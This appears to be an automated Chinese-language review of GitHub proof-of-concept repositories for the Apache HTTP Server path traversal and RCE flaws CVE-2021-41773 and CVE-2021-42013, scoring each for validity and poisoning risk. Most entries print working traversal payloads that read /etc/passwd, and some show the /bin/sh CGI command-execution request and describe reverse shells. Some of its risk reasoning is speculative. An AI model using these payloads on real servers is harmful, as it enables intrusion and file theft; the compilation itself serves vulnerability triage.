CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。攻击者可以利用路径遍历绕过 Alias 指令的限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，并且被访问的目录中存在可执行的 CGI 脚本，攻击者就可以通过构造恶意的 URL 来执行任意代码。

**有效性：**
提供的 POC 代码旨在利用此漏洞。`exploit.py` 脚本首先尝试通过发送包含路径遍历序列的 HTTP 请求来验证目标是否易受攻击，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果从 `/etc/passwd` 文件中检测到 "root:" 和 "bin/" 字符串，则认为目标易受攻击。然后，该脚本尝试利用漏洞通过反向 shell 在目标上执行任意代码。

**利用方式：**
1.  使用路径遍历序列（例如，`.%2e` 或 URL 编码的 `.%2532%2565`）来绕过目录限制。
2.  尝试读取敏感文件，如 `/etc/passwd`，以验证漏洞的存在。
3.  如果服务器配置允许，则利用 CGI 脚本执行任意命令。这通常涉及构造包含命令的 URL，并将该 URL 发送到易受攻击的服务器。
4. 设置监听器，等待反向shell连接。

**投毒风险：**
虽然主要代码看起来直接实现了漏洞利用，但仍然存在一定的投毒风险。可能性大约为 10%。

*   依赖关系：`exploit.py` 脚本依赖于 `requests` 库。虽然 `requests` 是一个流行的 Python 库，但存在供应链攻击的风险。恶意攻击者可能会尝试污染 `requests` 库或类似的依赖项，从而在不知不觉中将恶意代码引入到 `exploit.py` 中。
*   CGI配置的判断：如果目标服务器上未启用 CGI 或 CGI 配置不正确，该漏洞可能无法利用进行 RCE。POC代码中关于CGI的利用可能无法执行.
*   代码审查：在执行任何未经审核的代码（包括此 POC）之前，务必进行彻底的代码审查，以确保其不包含恶意功能。特别注意反向 shell 部分，确保它只执行预期命令。
*  作者动机: 无法完全信任代码作者的真实目的。尽管代码可能有效利用漏洞，但作者可能有意或无意地包含后门或恶意代码。
* 编码问题：URL 编码和解码可能存在问题，导致意外行为。

**项目地址:** [adrianmafandy/CVE-2021-41773](https://github.com/adrianmafandy/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #19

**来源**: [CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md](../2021/CVE-2021-41773-aqiao-jashell_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的 URL，读取服务器上受限目录之外的文件。如果服务器上启用了 CGI 脚本执行，则攻击者可以进一步利用此漏洞执行任意代码。

**有效性:**
根据漏洞库信息，搜索引擎结果，以及漏洞利用代码，提供的POC代码是有效的。漏洞库信息和搜索结果都表明此漏洞已被公开利用。

**投毒风险:**
提供的Go语言漏洞利用代码，主要功能是利用路径遍历漏洞读取`/etc/passwd`文件或执行命令。虽然代码本身实现了漏洞验证和利用功能，但仍然存在一定的投毒风险。

1.  **依赖风险:** Go程序需要编译，编译过程中可能引入恶意依赖。但是本项目代码量较小，依赖风险较低。
2.  **后门代码:** 检查代码后，发现其中并没有明显的恶意代码或后门。然而，攻击者可以修改代码以包含恶意功能，例如上传受害服务器的信息或执行其他恶意操作。
3.  **供应链风险:** 代码托管在第三方平台（GitHub），存在被篡改的风险。如果从不可信的来源下载代码，可能会下载到被修改过的恶意版本。

综合考虑，该仓库存在10%的投毒风险，主要来自潜在的依赖污染和代码篡改。

**利用方式:**
该漏洞的利用方式主要分以下几步：

1.  **路径遍历:** 攻击者构造包含`/.%2e`的恶意URL，尝试绕过Apache的路径规范化检查，从而访问服务器上任意文件。
2.  **信息泄露:** 如果路径遍历成功，攻击者可以读取敏感文件，例如`/etc/passwd`，获取系统用户信息。
3.  **远程代码执行:** 如果服务器启用了CGI脚本，攻击者可以通过POST请求将恶意命令传递给`sh`执行，从而实现远程代码执行。 例如，可以发送包含 `echo; <command>` 的POST请求到 `/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh`。

**项目地址:** [aqiao-jashell/CVE-2021-41773](https://github.com/aqiao-jashell/CVE-2021-41773)

